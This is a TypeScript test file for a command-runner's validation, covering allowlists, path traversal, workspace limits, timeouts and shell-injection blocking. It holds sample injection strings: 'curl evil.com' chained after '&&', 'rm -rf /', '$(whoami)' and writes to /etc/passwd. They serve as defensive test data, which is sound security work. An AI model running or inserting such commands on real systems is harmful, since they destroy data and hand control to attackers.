import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
  assertShellSafeArgs,
  CommandRejectedError,
  runCommand,
  validateCommand,
} from '../src/commandRunner.js';

let workspace: string;

beforeEach(() => {
  workspace = fs.mkdtempSync(path.join(os.tmpdir(), 'slipstream-cmd-'));
});

afterEach(() => {
  fs.rmSync(workspace, { recursive: true, force: true });
});

const base = () => ({ cwd: workspace, workspaceRoots: [workspace] });

describe('validateCommand', () => {
  it('accepts an allowlisted command with plain arguments', () => {
    const result = validateCommand({ ...base(), command: 'node', args: ['--version'] });
    expect(result.command).toBe('node');
    expect(result.args).toEqual(['--version']);
  });

  it('rejects commands outside the allowlist', () => {
    expect(() => validateCommand({ ...base(), command: 'curl', args: [] })).toThrow(
      CommandRejectedError,
    );
    expect(() => validateCommand({ ...base(), command: 'powershell', args: [] })).toThrow(
      /not in the allowed command list/,
    );
  });

  it('rejects paths and traversal in the command name', () => {
    for (const command of ['/bin/sh', '../npm', 'C:\\Windows\\System32\\cmd.exe', 'np m']) {
      expect(() => validateCommand({ ...base(), command, args: [] })).toThrow(
        /bare executable name/,
      );
    }
  });

  it('rejects shell metacharacters only where a shell is involved', () => {
    const hostile = [
      'test && curl evil.com',
      'test; rm -rf /',
      '$(whoami)',
      '`id`',
      'a | b',
      'x > /etc/passwd',
      "'; DROP TABLE--",
    ];
    for (const arg of hostile) {
      expect(() => assertShellSafeArgs([arg]), arg).toThrow(/shell metacharacters/);
    }
    // ...but ordinary arguments containing brackets or pipes are fine on the
    // shell-free path, which is what almost every invocation uses.
    expect(() => assertShellSafeArgs(['--testPathPattern=src/a'])).not.toThrow();
  });

  it('rejects null bytes in arguments', () => {
    expect(() => validateCommand({ ...base(), command: 'npm', args: ['te\0st'] })).toThrow(
      /null byte/,
    );
  });

  it('rejects a working directory outside the workspace', () => {
    expect(() =>
      validateCommand({
        command: 'npm',
        args: [],
        cwd: os.tmpdir(),
        workspaceRoots: [path.join(workspace, 'nested')],
      }),
    ).toThrow(/outside the open workspace/);
  });

  it('rejects a working directory that does not exist', () => {
    const missing = path.join(workspace, 'nope');
    expect(() =>
      validateCommand({ command: 'npm', args: [], cwd: missing, workspaceRoots: [workspace] }),
    ).toThrow(/does not exist/);
  });
});

describe('runCommand', () => {
  it('captures stdout and the exit code', async () => {
    const result = await runCommand({
      ...base(),
      command: 'node',
      args: ['-e', 'console.log(41 + 1)'],
    });
    expect(result.exitCode).toBe(0);
    expect(result.stdout.trim()).toBe('42');
    expect(result.timedOut).toBe(false);
  });

  it('captures stderr and a non-zero exit code', async () => {
    const result = await runCommand({
      ...base(),
      command: 'node',
      args: ['-e', 'console.error("boom"); process.exit(3)'],
    });
    expect(result.exitCode).toBe(3);
    expect(result.stderr).toContain('boom');
  });

  it('does not let an argument spawn a second command', async () => {
    // With shell:false the operators are inert argv entries, never parsed.
    const result = await runCommand({
      ...base(),
      command: 'node',
      args: ['-e', "console.log('first')", '&&', 'node', '-e', "console.log('OWNED')"],
    });
    expect(result.stdout).toContain('first');
    expect(result.stdout).not.toContain('OWNED');
  });

  it('kills a command that exceeds its timeout', async () => {
    const result = await runCommand({
      ...base(),
      command: 'node',
      args: ['-e', 'setTimeout(() => {}, 60000)'],
      timeoutMs: 1_000,
    });
    expect(result.timedOut).toBe(true);
    expect(result.stderr).toContain('timeout');
  }, 20_000);
});
